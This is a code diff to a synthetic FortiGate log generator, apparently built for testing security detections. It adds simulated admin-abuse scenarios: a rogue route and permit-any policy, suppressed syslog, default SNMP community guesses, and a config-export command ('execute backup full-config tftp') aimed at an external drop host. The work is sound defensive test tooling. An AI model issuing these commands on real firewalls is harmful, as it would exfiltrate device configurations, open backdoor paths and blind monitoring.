@@ -76,6 +76,7 @@ try:
                                        vpn_username, impossible_travel_ips)
     from modules import resolver
     from modules import threat_domains
+    from modules import mgmt_plane
 except ImportError:
     from session_utils import (get_random_user, find_user_by_ip, rand_ip_from_network, host_mac,
                                stable_vpn_ip, stable_mail_servers, weighted_destination,
@@ -83,7 +84,7 @@ except ImportError:
                                        rare_external_ip, rare_internal_host, rare_domain, ip_country,
                                        vpn_username, impossible_travel_ips)
     import resolver
-
+    import mgmt_plane
     import threat_domains
 # Module identity
 NAME        = "Fortinet FortiGate"
@@ -205,6 +206,13 @@ _DEFAULT_THREAT_EVENTS = [
      "xsiam_alert": "Abnormal RDP session to a remote host from a rarely seen host"},
     {"event": "rare_smtp_session",     "weight": 2,  "analytic": True,
      "xsiam_alert": "Rare SMTP/S Session"},
+    # Management plane (2026-10-19, gocortexio advisory corpus MANAGEMENT patterns).
+    # No shipped Cortex analytic covers device administration: hunting / correlation.
+    {"event": "mgmt_admin_unexpected_source", "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_config_route_change",     "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_logging_suppressed",      "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_config_harvest",          "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "snmp_unexpected_source",       "weight": 1, "analytic": False, "xsiam_alert": None},
 ]
 
 # --- Display-name mapping (same pattern as checkpoint_firewall.py) ---
@@ -978,11 +986,14 @@ def _generate_admin_event(config):
     """Admin login success or failure — event:system."""
     forti_conf   = _get_config(config)
     admin_users  = forti_conf.get("admin_users", ["admin"])
-    user         = random.choice(admin_users)
+    # The shared operations team (mgmt_plane) mostly; the device's local accounts
+    # occasionally. Admin logins come from the admin subnet only: until 2026-10-19 they
+    # came from any user workstation, which made "admin from an unexpected source" the
+    # baseline.
+    user         = (mgmt_plane.admin_user(config) if random.random() < 0.85
+                    else random.choice(admin_users))
     mgmt_ip      = forti_conf.get("management_ip", "172.16.200.1")
-    # Admin logins originate from operator workstations, not servers
-    umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
-    src_ip = random.choice(list(umap.values())) if umap else "172.16.200.50"
+    src_ip       = mgmt_plane.admin_source(config)
     is_success   = random.random() > 0.15
 
     if is_success:
@@ -1501,7 +1512,8 @@ def _generate_benign_log(config, session_context=None):
                    "ntp_sync", "antivirus_allow", "ipsec_vpn",
                    "rdp_internal", "ftp_download", "smb_internal",
                    "vpn_login_benign", "vpn_failure_benign", "email_event",
-                   "ad_auth", "vpn_new_country_login"]
+                   "ad_auth", "vpn_new_country_login",
+                   "mgmt_admin_session", "snmp_poll"]
         weights = [36,               18,              9,                7,
                    3,             3,            2,
                    4,           3,              2,
@@ -1511,7 +1523,9 @@ def _generate_benign_log(config, session_context=None):
                    # path: threats are interval-gated (~12/day at "Realistic") and then
                    # weighted, giving ~0.3 firings/day, but the day-keyed country rotation
                    # needs at least ONE emission every day or that day's country is skipped.
-                   5,        2]
+                   5,        2,
+                   # management plane: ~40 sessions, ~800 polls a day at 1 call/s
+                   0.05, 1]
 
     chosen = random.choices(events, weights=weights, k=1)[0]
 
@@ -1519,7 +1533,7 @@ def _generate_benign_log(config, session_context=None):
     user, src_ip, shost = "unknown", "192.168.1.100", None
     if chosen not in ("inbound_block", "admin_event", "vpn_event", "ipsec_vpn",
                       "vpn_login_benign", "vpn_failure_benign",
-                      "vpn_new_country_login"):
+                      "vpn_new_country_login", "mgmt_admin_session", "snmp_poll"):
         if session_context:
             user_info = get_random_user(session_context, preferred_device_type="workstation")
             if user_info:
@@ -1545,6 +1559,10 @@ def _generate_benign_log(config, session_context=None):
         return _generate_dns_query(config, src_ip, user, shost)
     elif chosen == "admin_event":
         return _generate_admin_event(config)
+    elif chosen == "mgmt_admin_session":
+        return _simulate_mgmt_admin_session(config, session_context)
+    elif chosen == "snmp_poll":
+        return _simulate_snmp_poll(config, session_context)
     elif chosen == "vpn_event":
         return _generate_vpn_event(config, session_context)
     elif chosen == "ntp_sync":
@@ -3943,6 +3961,19 @@ def _generate_threat_log(config, session_context=None, forced_event=None):
     if chosen == "server_outbound_http":
         return (_simulate_server_outbound_http(config), display_name)
 
+    # --- Management plane ---
+    if chosen == "mgmt_admin_unexpected_source":
+        return (_simulate_mgmt_admin_unexpected_source(config, session_context), display_name)
+    if chosen == "mgmt_config_route_change":
+        return (_simulate_mgmt_config_route_change(config, session_context), display_name)
+    if chosen == "mgmt_logging_suppressed":
+        return (_simulate_mgmt_logging_suppressed(config, session_context,
+                                                  backdate=_MGMT_BACKDATE.get("on", False)), display_name)
+    if chosen == "mgmt_config_harvest":
+        return (_simulate_mgmt_config_harvest(config, session_context), display_name)
+    if chosen == "snmp_unexpected_source":
+        return (_simulate_snmp_unexpected_source(config, session_context), display_name)
+
     # --- Generators that now return lists (DNS precursor + event) ---
     # Resolve user/IP for user-attributed generators
     user, src_ip, shost = "unknown", "192.168.1.100", None
@@ -4017,6 +4048,223 @@ def _generate_threat_log(config, session_context=None, forced_event=None):
         return (_simulate_smb_rare_file_transfer(config, src_ip, user, shost), display_name)
     else:
         return (_simulate_ips_attack(config), display_name)
+
+
+# Management plane
+#
+# FortiOS 7.4.4 log IDs (Log Message Reference, "Log ID definitions"):
+#   0100032001 LOG_ID_ADMIN_LOGIN_SUCC     0100032002 LOG_ID_ADMIN_LOGIN_FAIL
+#   0100032003 LOG_ID_ADMIN_LOGOUT         0100032143 LOG_ID_BACKUP_CONF_BY_SCP
+#   0100044546 LOGID_EVENT_CONFIG_ATTR     0100044547 LOGID_EVENT_CONFIG_OBJATTR
+#   0100044548 LOGID_EVENT_CONFIG_EXEC     0100029021 LOG_ID_EVENT_AUTH_SNMP_QUERY_FAILED
+# The FortiGate modeling rule maps cfgpath -> xdm.target.resource.type, cfgattr ->
+# .resource.name, cfgobj -> .resource.value; the admin is `user`, which Fortinet's CEF
+# mapping carries as duser (as the existing admin_event does).
+
+def _fgt_mgmt_event(config, logid, level, ts, fields):
+    return _format_fortinet_cef(config, logid, "event", "system", level, {
+        "_no_user_qualify": True,          # local admin accounts, not AD identities
+        "FTNTFGTeventtime": int(ts * 1_000_000_000),
+        **fields})
+
+
+def _fgt_admin_session(config, user, src, actions, method="ssh", start=None,
+                       failures=0, gap=(2, 25), devname=None):
+    """failures x 32002 -> 32001 login -> config/exec events -> 32003 logout.
+    actions: list of (logid, fields) built by _fgt_cfg_attr / _fgt_cfg_exec."""
+    forti_conf = _get_config(config)
+    dst = (forti_conf.get("management_ip", "172.16.200.1")
+           if src.startswith(("10.", "172.", "192.168."))
+           else forti_conf.get("vpn_gateway_ip", "203.0.113.20"))
+    ui = f"{method}({src})"
+    t = start or time.time() - (len(actions) + 3) * gap[1]
+    base = {"duser": user, "src": src, "dst": dst, "FTNTFGTui": ui, "FTNTFGTmethod": method}
+    if devname:   # a peer FortiGate: its own name and serial
+        serial = forti_conf.get("serial_number", "FGVM08TM21000001")
+        base["dvchost"] = devname
+        base["deviceExternalId"] = serial[:-4] + hashlib.sha1(devname.encode()).hexdigest()[:4].upper()
+    out = []
+    for _ in range(failures):
+        out.append(_fgt_mgmt_event(config, "0100032002", "alert", t, {
+            **base, "act": "login", "outcome": "failed", "reason": "passwd_invalid",
+            "FTNTFGTlogdesc": "Admin login failed",
+            "msg": f"Administrator {user} login failed from {ui} because of invalid password"}))
+        t += random.randint(2, 6)
+    out.append(_fgt_mgmt_event(config, "0100032001", "information", t, {
+        **base, "act": "login", "outcome": "success", "FTNTFGTlogdesc": "Admin login successful",
+        "msg": f"Administrator {user} logged in successfully from {ui}"}))
+    login_t = t
+    for logid, f in actions:
+        t += random.randint(*gap)
+        out.append(_fgt_mgmt_event(config, logid, "information", t, {**base, **f}))
+    t += random.randint(*gap)
+    out.append(_fgt_mgmt_event(config, "0100032003", "information", t, {
+        **base, "act": "logout", "outcome": "success", "FTNTFGTlogdesc": "Admin logout successful",
+        "FTNTFGTduration": int(t - login_t),
+        "msg": f"Administrator {user} timed out on {ui}" if random.random() < 0.2
+               else f"Administrator {user} logged out from {ui}"}))
+    return out
+
+
+def _fgt_cfg_attr(path, attr, act="Edit", obj=None):
+    f = {"act": act, "FTNTFGTcfgtid": random.randint(1000000, 9999999), "FTNTFGTcfgpath": path,
+         "FTNTFGTcfgattr": attr}
+    if obj is not None:
+        f.update({"FTNTFGTcfgobj": str(obj), "FTNTFGTlogdesc": "Object attribute configured",
+                  "msg": f"{act} {path} {obj}"})
+        return ("0100044547", f)
+    f.update({"FTNTFGTlogdesc": "Attribute configured", "msg": f"{act} {path}"})
+    return ("0100044546", f)
+
+
+def _fgt_cfg_exec(command):
+    return ("0100044548", {"act": "Execute", "FTNTFGTcfgpath": "execute",
+                           "FTNTFGTlogdesc": "Configuration executed", "msg": command})
+
+
+_FGT_ROUTINE_CHANGES = [
+    lambda n: _fgt_cfg_attr("firewall.address", f"subnet[10.0.10.{n} 255.255.255.255]",
+                            act="Add", obj=f"SRV-WEB-{n}"),
+    lambda n: _fgt_cfg_attr("firewall.policy", f"comments[CHG{n} patch window]", obj=str(n % 40 + 1)),
+    lambda n: _fgt_cfg_attr("firewall.addrgrp", f"member[SRV-WEB-{n}]", obj="GRP-PATCH-SRV"),
+]
+
+
+def _simulate_mgmt_admin_session(config, session_context=None):
+    """BENIGN: a network admin from the NOC jump host; one session in five changes
+    something routine. Status checks leave only the login/logout pair, as on a real
+    FortiGate (show/get commands are not logged)."""
+    user, src = mgmt_plane.admin_user(config), mgmt_plane.admin_source(config)
+    acts = []
+    if random.random() < 0.2:
+        n = random.randint(20, 240)
+        acts = [random.choice(_FGT_ROUTINE_CHANGES)(n)]
+    return _fgt_admin_session(config, user, src, acts, method=random.choice(["ssh", "https"]))
+
+
+def _simulate_mgmt_config_backup(config, session_context=None):
+    """BENIGN: the nightly backup job pulls the config over SCP."""
+    host, acct = mgmt_plane.backup(config)
+    return [_fgt_mgmt_event(config, "0100032143", "information", time.time(), {
+        "duser": acct, "src": host, "dst": _get_config(config).get("management_ip", "172.16.200.1"),
+        "FTNTFGTui": f"ssh({host})", "act": "backup", "outcome": "success",
+        "FTNTFGTlogdesc": "Configuration backed up by SCP",
+        "msg": f"System config file has been downloaded by user {acct} via SCP"})]
+
+
+def _simulate_snmp_poll(config, session_context=None):
+    """BENIGN: the monitoring poller reads SNMP from infrastructure behind the FortiGate."""
+    poller = mgmt_plane.snmp_poller(config)
+    dev = random.choice(mgmt_plane.network_devices(config))
+    fields = _base_traffic_fields(config, poller, None, None, dev, None, "17", 161, "accept",
+                                  duration_s=random.randint(0, 2))
+    fields.update({"app": "SNMP", "FTNTFGTapp": "SNMP", "FTNTFGTappcat": "Network.Service",
+                   "FTNTFGTservice": "SNMP", "out": random.randint(80, 300),
+                   "in": random.randint(200, 1500), "msg": "SNMP poll"})
+    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)
+
+
+def _simulate_mgmt_admin_unexpected_source(config, session_context=None):
+    """THREAT device-admin-from-unexpected-source (see cisco_asa for the pattern)."""
+    src, kind = mgmt_plane.unexpected_source(config, session_context)
+    user = mgmt_plane.admin_user(config)
+    print(f"    - Fortinet Module simulating: admin login from unexpected source {src} ({kind})")
+    return _fgt_admin_session(config, user, src, [], method=random.choice(["ssh", "https"]),
+                              failures=random.randint(0, 2))
+
+
+def _simulate_mgmt_config_route_change(config, session_context=None):
+    """THREAT network-device-config-or-route-change: rogue static route, permit-any
+    policy and an IPsec tunnel to an attacker-controlled peer."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.6 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    user, rogue = mgmt_plane.admin_user(config), rare_external_ip()
+    wan = _get_config(config).get("interface_wan", "port1")
+    print(f"    - Fortinet Module simulating: route/policy change via {rogue} from {src} ({kind})")
+    acts = [
+        _fgt_cfg_attr("router.static", f"gateway[{rogue}]dst[10.0.10.0 255.255.255.0]device[{wan}]",
+                      act="Add", obj=str(random.randint(20, 90))),
+        _fgt_cfg_attr("firewall.policy", "srcaddr[all]dstaddr[all]action[accept]service[ALL]",
+                      act="Add", obj=str(random.randint(900, 990))),
+        _fgt_cfg_attr("vpn.ipsec.phase1-interface", f"remote-gw[{rogue}]interface[{wan}]",
+                      act="Add", obj="sync-tun"),
+    ]
+    return _fgt_admin_session(config, user, src, acts, method="ssh")
+
+
+_FGT_SUPPRESS_KEY = "fortinet_fortigate"
+_MGMT_BACKDATE = {"on": False}   # set by generate_log for an on-demand fire (harness)
+
+
+def _fgt_logging_toggle(config, user, src, ts, enable):
+    old, new = ("disable", "enable") if enable else ("enable", "disable")
+    forti_conf = _get_config(config)
+    return _fgt_mgmt_event(config, "0100044546", "information", ts, {
+        "duser": user, "src": src, "dst": forti_conf.get("management_ip", "172.16.200.1"),
+        "FTNTFGTui": f"ssh({src})", **_fgt_cfg_attr("log.syslogd.setting",
+                                                     f"status[{old}->{new}]")[1]})
+
+
+def _simulate_mgmt_logging_suppressed(config, session_context=None, backdate=False):
+    """THREAT network-device-logging-suppressed-for-a-window: syslog forwarding set to
+    disable, silence, then re-enabled (see cisco_asa for the window mechanics)."""
+    user = mgmt_plane.admin_user(config)
+    src, _ = (mgmt_plane.unexpected_source(config, session_context)
+              if random.random() < 0.5 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    window = mgmt_plane.suppression_window_seconds()
+    now = time.time()
+    print(f"    - Fortinet Module simulating: logging suppressed by {user} from {src} for {window}s")
+    start = now - window - 60 if backdate else now - 40
+    off = _fgt_admin_session(config, user, src, [], method="ssh", start=start)[:-1]  # no logout yet
+    off.append(_fgt_logging_toggle(config, user, src, start + 30, enable=False))
+    if backdate:
+        return off + [_fgt_logging_toggle(config, user, src, now, enable=True)]
+    mgmt_plane.open_suppression(_FGT_SUPPRESS_KEY, window, user, src)
+    return off
+
+
+def _simulate_mgmt_config_harvest(config, session_context=None):
+    """THREAT scripted-device-config-harvesting: one source, several FortiGates, a few
+    seconds each, every session exporting the full config to an outside TFTP server."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.5 else (random.choice(mgmt_plane.conf(config)["jump_hosts"]), "jump-host"))
+    user, drop = mgmt_plane.admin_user(config), rare_external_ip()
+    devices = mgmt_plane.sibling_hostnames(_get_config(config).get("hostname", "FG-FW-01"),
+                                           random.randint(3, 5))
+    print(f"    - Fortinet Module simulating: config harvest of {len(devices)} devices from {src} ({kind})")
+    t, out = time.time() - 75 * len(devices), []
+    for dev in devices:
+        out += _fgt_admin_session(config, user, src,
+                                  [_fgt_cfg_exec(f"execute backup full-config tftp {dev.lower()}.conf {drop}")],
+                                  method="ssh", start=t, gap=(1, 3), devname=dev)
+        t += random.randint(15, 60)
+    return out
+
+
+def _simulate_snmp_unexpected_source(config, session_context=None):
+    """THREAT snmp-from-unexpected-source: a workstation walks every network device on
+    UDP/161, and its guesses at the FortiGate's own community string fail."""
+    ui = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
+    src, user, shost = (ui["ip"], ui["username"], ui.get("hostname")) if ui else ("192.168.1.100", None, None)
+    print(f"    - Fortinet Module simulating: SNMP walk from {src}")
+    t, out = time.time() - 60, []
+    for dev in mgmt_plane.network_devices(config):
+        f = _base_traffic_fields(config, src, shost, user, dev, None, "17", 161, "accept",
+                                 duration_s=random.randint(0, 3))
+        f.update({"app": "SNMP", "FTNTFGTapp": "SNMP", "FTNTFGTappcat": "Network.Service",
+                  "FTNTFGTservice": "SNMP", "out": random.randint(60, 200),
+                  "in": random.randint(800, 40000), "FTNTFGTeventtime": int(t * 1_000_000_000),
+                  "msg": "SNMP request"})
+        out.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", f))
+        t += random.randint(1, 4)
+    for community in ("public", "private", "cisco"):
+        out.append(_fgt_mgmt_event(config, "0100029021", "warning", t, {
+            "src": src, "dst": _get_config(config).get("management_ip", "172.16.200.1"),
+            "dpt": 161, "act": "snmp-query", "outcome": "failed",
+            "FTNTFGTlogdesc": "SNMP query failed",
+            "msg": f"SNMP query failed from {src}: community '{community}' not configured"}))
+        t += 1
+    return out
 
 
 # Scenario handler
@@ -4117,7 +4365,30 @@ def generate_log(config, scenario=None, threat_level="Realistic", benign_only=Fa
                 logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
             return logs
         # Named threat from dashboard — dispatch to the specific event
-        return _generate_threat_log(config, session_context, forced_event=scenario_event)
+        _MGMT_BACKDATE["on"] = bool(ctx.get("mgmt_backdate"))
+        try:
+            return _generate_threat_log(config, session_context, forced_event=scenario_event)
+        finally:
+            _MGMT_BACKDATE["on"] = False
+
+    # Logging suppressed: silent until the window closes, then the same admin turns
+    # syslog forwarding back on and logs out (_simulate_mgmt_logging_suppressed).
+    _sup = mgmt_plane.suppression_state(_FGT_SUPPRESS_KEY)
+    if _sup == "active":
+        return None
+    if _sup:
+        now = time.time()
+        forti_conf = _get_config(config)
+        return [_fgt_logging_toggle(config, _sup["user"], _sup["src"], now, enable=True),
+                _fgt_mgmt_event(config, "0100032003", "information", now + 3, {
+                    "duser": _sup["user"], "src": _sup["src"],
+                    "dst": forti_conf.get("management_ip", "172.16.200.1"),
+                    "FTNTFGTui": f"ssh({_sup['src']})", "act": "logout", "outcome": "success",
+                    "FTNTFGTlogdesc": "Admin logout successful",
+                    "FTNTFGTduration": int(now - _sup["since"]),
+                    "msg": f"Administrator {_sup['user']} logged out from ssh({_sup['src']})"})]
+    if mgmt_plane.backup_due(_FGT_SUPPRESS_KEY):
+        return _simulate_mgmt_config_backup(config, session_context)
 
     if benign_only:
         return _generate_benign_log(config, session_context)
